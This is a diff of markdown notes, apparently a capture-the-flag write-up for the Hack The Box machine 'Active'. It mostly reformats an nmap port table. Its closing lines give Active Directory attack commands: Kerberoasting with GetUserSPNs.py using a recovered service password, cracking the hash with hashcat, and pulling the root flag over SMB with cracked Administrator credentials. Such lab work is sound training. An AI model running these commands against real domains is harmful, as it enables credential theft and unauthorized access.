@@ -1,27 +1,31 @@
 # Active
-| Name | IP | Difficulty | OS |
-| active | 10.10.10.100 | Windows | Easy |
 
-## Nmap
-| HOST | PORT | PROTO | SERVICE | VERSION
-| 10.10.10.100 | 135 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 139 | tcp | Microsoft Windows netbios-ssn |  | 
-| 10.10.10.100 | 3268 | tcp | Microsoft Windows Active Directory LDAP |  | 
-| 10.10.10.100 | 3269 | tcp |  |  | 
-| 10.10.10.100 | 389 | tcp | Microsoft Windows Active Directory LDAP |  | 
-| 10.10.10.100 | 445 | tcp |  |  | 
-| 10.10.10.100 | 464 | tcp |  |  | 
-| 10.10.10.100 | 49152 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 49153 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 49154 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 49155 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 49157 | tcp | Microsoft Windows RPC over HTTP | 1.0 | 
-| 10.10.10.100 | 49158 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 49165 | tcp | Microsoft Windows RPC |  | 
-| 10.10.10.100 | 53 | tcp | Microsoft DNS | 6.1.7601 (1DB15D39) | 
-| 10.10.10.100 | 593 | tcp | Microsoft Windows RPC over HTTP | 1.0 | 
-| 10.10.10.100 | 636 | tcp |  |  | 
-| 10.10.10.100 | 88 | tcp | Microsoft Windows Kerberos |  | 
+| Name   | IP           | Difficulty | OS   |
+| ------ | ------------ | ---------- | ---- |
+| active | 10.10.10.100 | Windows    | Easy |
+
+## NMAP
+
+| HOST         | PORT  | PROTO | SERVICE                                 | VERSION             |
+| ------------ | ----- | ----- | --------------------------------------- | ------------------- |
+| 10.10.10.100 | 135   | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 139   | tcp   | Microsoft Windows netbios-ssn           |                     |
+| 10.10.10.100 | 3268  | tcp   | Microsoft Windows Active Directory LDAP |                     |
+| 10.10.10.100 | 3269  | tcp   |                                         |                     |
+| 10.10.10.100 | 389   | tcp   | Microsoft Windows Active Directory LDAP |                     |
+| 10.10.10.100 | 445   | tcp   |                                         |                     |
+| 10.10.10.100 | 464   | tcp   |                                         |                     |
+| 10.10.10.100 | 49152 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 49153 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 49154 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 49155 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 49157 | tcp   | Microsoft Windows RPC over HTTP         | 1.0                 |
+| 10.10.10.100 | 49158 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 49165 | tcp   | Microsoft Windows RPC                   |                     |
+| 10.10.10.100 | 53    | tcp   | Microsoft DNS                           | 6.1.7601 (1DB15D39) |
+| 10.10.10.100 | 593   | tcp   | Microsoft Windows RPC over HTTP         | 1.0                 |
+| 10.10.10.100 | 636   | tcp   |                                         |                     |
+| 10.10.10.100 | 88    | tcp   | Microsoft Windows Kerberos              |                     |
 
 ## HEADERS
 
@@ -47,4 +51,4 @@
 - Administrator is Kerberoastable `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs`
 - Kerberoast `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile active_spns.txt`
 - Crack the hash with hashcat `.\hashcat.exe -m 13100 .\hashes\active-htb.txt .\wordlists\rockyou.txt
-- Download the root flag 'smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100 -R Users -A root.txt -q`
+- Download the root flag `smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100 -R Users -A root.txt -q`
